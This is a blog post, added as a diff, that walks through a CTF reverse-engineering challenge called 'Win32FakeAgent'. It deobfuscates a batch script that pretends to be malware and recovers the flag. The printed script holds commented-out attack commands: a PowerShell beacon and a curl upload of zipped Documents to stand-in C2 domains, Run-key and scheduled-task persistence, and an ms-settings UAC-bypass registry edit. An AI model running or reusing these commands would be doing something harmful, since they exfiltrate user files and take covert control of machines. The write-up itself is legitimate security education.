@@ -1,0 +1,214 @@
+---
+title: "Win32FakeAgent"
+description: "RISC intro2rev challenge 4"
+pubDate: "Sep 24 2025"
+heroImage: "/hero/risc-index_Raaquilla.webp"
+tags: ["cyber", "ctf", "batch", "python", "obfuscation"]
+---
+
+## Challenge description
+
+Very legit batch script.
+
+___
+
+## Approach
+
+Looking at the script, it has been heavily obfuscated.
+
+```batch
+ÿþ&@cls&@set "lÃ«ÃA=tmylChqW 27nrHKpo0A6k3LdgEcYDv8bIPUa1MeFS@swZf9XV4uOiGJNjTBxRz5Q"
+%lÃ«ÃA:~41,1%%lÃ«ÃA:~38,1%%lÃ«ÃA:~26,1%%lÃ«ÃA:~5,1%%lÃ«ÃA:~16,1%%lÃ«ÃA:~8,1%%lÃ«ÃA:~16,1%%lÃ«ÃA:~45,1%...
+%lÃ«ÃA:~42,1%%lÃ«ÃA:~38,1%%lÃ«ÃA:~0,1%%lÃ«ÃA:~3,1%%gÃVLÃJ%%lÃ«ÃA:~16,1%%lÃ«ÃA:~26,1%%lÃ«ÃA:~35,1%...
+%lÃ«ÃA:~0,1%%lÃ«ÃA:~52,1%%lÃ«ÃA:~0,1%%lÃ«ÃA:~3,1%%lÃ«ÃA:~38,1%%lÃ«ÃA:~8,1%(%lÃ«ÃA:~42,1%%lÃ«ÃA:~2,1%...
+```
+
+The first thing that sticks out is the first line, being the only legible one.
+We can see some garbage at the start; `ÿþ&` but then there is some recognisable code.
+
+`@cls` runs `cls` which clears the screen.
+`@set "lÃ«ÃA=tmylChqW 27nrHKpo0A6k3LdgEcYDv8bIPUa1MeFS@swZf9XV4uOiGJNjTBxRz5Q"` sets a variable `lÃ«ÃA` to a seemingly random string of characters.
+
+Following this is many repetitions of the same pattern, `%lÃ«ÃA:~41,1%`.
+If we rename the variable its easier to read: `%string:~41,1%`.
+In batch, `%%` evaluates its content, and `:~x,y` gets a substring of ` y ` length from index ` x `.
+So the obfuscated text is recreating the actual script with many substrings of `lÃ«ÃA`.
+
+We can use a python script to evaluate all the substrings to get the resulting script.
+
+```python
+import re
+
+string = "tmylChqW 27nrHKpo0A6k3LdgEcYDv8bIPUa1MeFS@swZf9XV4uOiGJNjTBxRz5Q"
+variable = re.escape("lë�A") # "lÃ«ÃA" is "lë�A" in utf-8
+
+with open("Win32FakeAgent.bat", "rb") as f:
+    obfuscated = f.read().decode("utf-8", errors="replace")
+
+#                         ┌───┬─ first number is the index
+pattern = rf"%{variable}:~(\d+),(\d+)%"
+#  second number is the length ─┴───┘
+
+def replacer(match):
+    start = int(match.group(1))
+    length = int(match.group(2))
+    return string[start : start + length]
+
+result = re.sub(pattern, replacer, obfuscated)
+
+with open("Win32FakeAgent_Deobfuscated.bat", "w") as f:
+    f.write(result)
+```
+
+Running the script replaces all substring calls on `lÃ«ÃA` with their actual substrings giving us `Win32FakeAgent_Deobfuscated.bat`.
+
+```batch
+��&@cls&@set "lë�A=tmylChqW 27nrHKpo0A6k3LdgEcYDv8bIPUa1MeFS@swZf9XV4uOiGJNjTBxRz5Q"
+@echo off
+setl%g�V�L�J%ocal EnableExtensions Enab%��ur���%leDel%g�uN���%ayedExpans%��zn�h�%ion
+title (system) svcho%�Qh����%st.exe  [Sessio%�ekjIo�%n-0]
+
+cls
+echo [*] Initial%gNKT�qC%izing subsystem...
+call%�����v�% :sleep 80
+echo%ï�K�ì% [*] Loading k%���z���%ernel32… OK%p��qN�z%
+call :slee%�_���z�%p 50
+e%nF��P��%cho%��IXA��% [*] Resolving imp%���d�í%orts… OK
+call :sleep 50
+echo.
+
+set%ÖGMH��% "HOST_ID=%COMPUTERNAME%-%RANDOM%-%RANDOM%"
+set "RUN%QÇzt�W%_ID=%DATE%_%TIME%"
+set "TMPDIR=%TEMP%\win32_%RANDOM%"
+md "%TMPDIR%" >nul 2>nul
+echo [.] host=%COMPUTERNAME% user=%USERNAME% sid=? run=%RUN_ID%
+echo [.] tmp=%TMPDIR%
+call :slee%C�rF�l�%p%XSGwåg% 4%ZkBIDuP%0
+
+set%�XQZ�UO% "MUTEX=Globa%�HDZOkV%l\{76A1B5C0-1AF3-4e5d-9021-%RANDOM%}"
+echo [.] checking m%��eènF%utex "!MUTEX!" ... not present
+REM powershell -nop -c "[void][S%ù��pt�%ystem.Thre%w�o�t�I%adi%EH���FB%ng.Mutex%k��ny�W%]::new($false,'!MUTEX!')"  :: disabled
+call :sleep 30
+
+echo [.] anti%�p�_�r�%-vm chec%�A�x�z�%ks: cpuid^=OK  rdtsc^=OK  drive%s�nQEYl%rs^=CLEAN
+ech%mêZ�I�%o [.] debugports%è�z�Z�%: none
+call :s%�Z���Ao%lee%BR�n�l�%p 50
+
+echo [>] sta%Xv�D��b%ging persi%�gCcW��%stence...
+REM reg add H%fíb��m%KCU\Software\Microsoft\W%�dIG��Y%indows\Curre%H�����e%ntVersion\Run /v OneDriveS%�Wbwm��%ync /d "\"%TMPDIR%\onedrive_update.vbs\"" /f
+REM schtasks /Create /SC MINUTE /MO 1%kCDwFO�%5 /TN OneD%ylAéRW%riveUpdate /TR "\"%TMPDIR%\onedrive_update.vbs\"" /RL HIGHEST /F
+e%ÅqW�Rp%cho  reg add HKCU\...\Run %����CU�%^(disabled^)
+echo  schtask%��qgh��%s /C%keCûf�%reate ^(disable%Bg��GzP%d^)
+call :sleep 6%e���J��%0
+
+set "C2_A=cdn.img-m%c�vs_é%sedge.live"
+se%ON�j�VY%t "C2_B=telemetry.api-msgra%F��ib�P%ph.site"
+set %IdJÄ�V%"UA=Mozilla/5.0 %��òdDK%(Windows NT 10.0; Win64; x64)"
+echo [>] c2 endpoints: %C2_A%  %C2_B%
+echo [>] us%�e���FM%er-agent:   %UA%
+ca%�eé�bj%ll :sleep 40
+
+echo [.] l%R���a��%oa%SY�wU�G%ding stage-1 payload…
+(
+  echo TVqQA%O�Nk�Vp%AMAAAAEAAAA/////wAAA^ %R���NS�%(noise)
+ %�zkKdvF% echo aG9zdD1sb2NhbGhvc3Q7cG9yd%Zf�dÜ�%D0zM%��r���v%TMzNztwcm90b2Nvb%��m�M�a%D1odHRw
+  echo ZG9jdHlwZT1hcH%üf�úp%BsaWNhdGlvb%fãBt��%i9vY3RldC1zdHJlYW0=  :: ← not real
+) > "%TMPDIR%\stage1.b64"
+call :sleep 70
+
+ech%rd_ëJ�%o [>] beac%ENpqCô%oning to %C2_A% ...
+REM power%I�E��C�%shell -nop -w %�Pi����%h%�Pn��Ss%idden -c "iwr -Us%o�W�rgZ%eBasicPars%�ùà��%ing http://%C2_A%/beacon?p=!HOST_ID!"  :: disabled
+echo [>] beaconing to %�LùD�S%%C2_B% ...
+RE%e��G�w�%M powershell -nop -w hidden -c "iw%�zfJpxc%r -UseBasicParsing https://%C2_B%/checkin -Headers @{UA='%UA%'}" :: disabled
+call :sleep 60
+
+echo [.] scanning user docs...
+for %%F in ("*.docx" "*.xlsx" "*.pdf") do (
+  echo  [sc%t��ïK�%an] %%~fF
+)
+call :sleep 30
+
+echo [>] stagin%�JqP�zQ%g archive…
+REM %�P�h�E�%powershell -nop -w hidden%��C�Kqj% -c "Compr%bl�T�FN%ess-Archive -Path '%USERPROFILE%\Documents\*' -DestinationPath '%TMPDIR%\cache.zip'" :: disabled
+REM curl -A "%UA%" -F "f=@%TMPDIR%\cache.zip" http://%C2_A%/upload  :: disabled
+echo  com%��d�k�l%press/upload disabled
+call :s%�p�r���%leep 50
+
+echo [>] toggling feature flags (disabled)
+REM reg add HKCU\Software\Classes\ms-settings\Shell\Ope%�KMBeEh%n\com%�P��én%mand /ve /d "\"cmd.exe\" /c calc" /f
+REM reg a%��å���%dd H%Rjã���%KCU\Software\Classes\ms-settings\S%XÜD���%hell%J��q�O�%\Open\command /v DelegateExecute /f
+
+(
+  echo ; ini p%�ódI�s%ayload (placeholder)
+  echo [agent]
+ %�V�M�G�% ech%kb�iZK�%o channel=stable
+  echo ring=slow
+  echo telem%��xd��p%et%�JW�e��%ry=on
+  echo guid={2A8E1C77-7D58-4BD%äp��î%3-9B1A-4F%RANDOM%}
+) > "%TMPDIR%\agent.ini"
+
+set "WIN%Wn�zrs�%32_PAYLOAD_KEY=RISC{i_saw_this_cra%vl�R�N�%p_in_real_m%E��zFm�%alware_once_lmao_cc259bfd43113288c5b42406b55a74%uOnòpa%71}"
+
+echo [.] sched%p�H�FRx%uling %���X�Z�%next run (simulated)
+for /l %%i in (1,1,8) do (
+  c%N��w�G�%all :sleep 40
+  ec%�z�a���%ho  [t] %��wï�F%%%i/8 heartbeat OK
+)
+
+echo [>] cleani%Rb�qv_S%ng traces...
+REM del /q "%TMPDIR%\stage1.b64"
+REM del /q "%TMPDIR%\agent.ini"
+REM rd /s /q "%TMPDIR%"
+echo  (cleanup disabled)
+call :sleep 40
+
+echo [*] done.
+echo Press any key to exit.
+pause%hsMIKå% >nul
+e%ISjmQz�%ndlocal & %I�cmQ��%exit /b 0
+
+:sleep
+set "_ms%��a����%=%~1"
+if%G����Q�% not defi%EFü��f%ned _ms set "_ms=120"
+set /a _ticks%G�h��V�%=(%_ms%+99)/100
+>nul ping -n !_ticks! 127.0.0.1
+exit /b
+
+:rot13
+set%EBwJ�tg%local EnableD%��f�ü�%elayedExpansion
+set %VhYu�j�%"dst="
+set%�A�ãq�% "src=%~2"
+for %wo�ÇuZ%/l %%i in (0,1,1023) do (
+  %LòUh��%set "c=!src:~%%i,1!"
+  if "!c!"=="" goto :rot13_done
+  set "x=!c!"
+  for%wD��C�a% %%A in (A B C D E F G H I J K L M) do if "!c!"=="%%A" set "x=!c:!=!" & set "x=" & set "x=!c!" & set "x=N"
+  set "x=!c!"
+  set "dst=!dst!!x!"
+)
+:rot13_done
+endlocal & set "%~1=%dst%"
+exit /b
+```
+
+import WrapCode from "@components/WrapCode.astro";
+
+<WrapCode />
+
+The key line is line 85 which contains "RISC".
+```batch
+set "WIN%Wn�zrs�%32_PAYLOAD_KEY=RISC{i_saw_this_cra%vl�R�N�%p_in_real_m%E��zFm�%alware_once_lmao_cc259bfd43113288c5b42406b55a74%uOnòpa%71}"
+```
+
+The variables like `%Wn�zrs�%`, and `%vl�R�N�%` dont exist so they evaluate to nothing, meaning we can remove them.
+
+```batch
+set "WIN32_PAYLOAD_KEY=RISC{i_saw_this_crap_in_real_malware_once_lmao_cc259bfd43113288c5b42406b55a7471}"
+```
+
+Our flag is:
+
+```
+RISC{i_saw_this_crap_in_real_malware_once_lmao_cc259bfd43113288c5b42406b55a7471}
+```
+
